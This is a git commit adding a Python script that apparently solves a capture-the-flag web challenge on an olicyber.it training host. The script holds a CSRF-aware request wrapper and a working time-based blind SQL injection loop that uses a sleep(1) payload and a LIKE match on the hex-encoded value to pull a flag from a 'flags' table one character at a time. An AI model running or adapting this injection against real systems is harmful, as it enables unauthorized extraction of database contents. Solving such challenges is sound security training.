8d66c91a6b07fde6bc408fdd04791a2ce8220c71
tommasotode <tommasotodescato@gmail.com>
2025-01-29 09:13:33 +0100

    sw20

---
+++ web/web20.py
@@ -0,0 +1,60 @@
+import requests
+from time import time
+
+
+class Inj:
+    def __init__(self, host):
+
+        self.sess = requests.Session()
+        self.base_url = '{}/api/'.format(host)
+        self._refresh_csrf_token()
+
+    def _refresh_csrf_token(self):
+        resp = self.sess.get(self.base_url + 'get_token')
+        resp = resp.json()
+        self.token = resp['token']
+
+    def _do_raw_req(self, url, query):
+        headers = {'X-CSRFToken': self.token}
+        data = {'query': query }
+        return self.sess.post(url,json=data, headers=headers).json()
+
+    def logic(self, query):
+        url = self.base_url + 'logic'
+        response = self._do_raw_req(url, query)
+        return response['result'], response['sql_error']
+
+    def union(self, query):
+        url = self.base_url + 'union'
+        response = self._do_raw_req(url, query)
+        return response['result'], response['sql_error']
+
+    def blind(self, query):
+        url = self.base_url + 'blind'
+        response = self._do_raw_req(url, query)
+        return response['result'], response['sql_error']
+
+    def time(self, query):
+        url = self.base_url + 'time'
+        response = self._do_raw_req(url, query)
+        return response['result'], response['sql_error']
+    
+
+inj = Inj('http://web-17.challs.olicyber.it')
+
+dictionary = '0123456789abcdef'
+result = ''
+while True:
+    for c in dictionary:
+        question = f"1' and (select sleep(1) from flags where HEX(flag) LIKE '{result+c}%')='1"
+        
+        s = time()
+        response, error = inj.time(question)
+        end = time() - s
+
+        if end > 1:        
+            result += c
+            print(c,end="")
+            break
+    else:
+        break
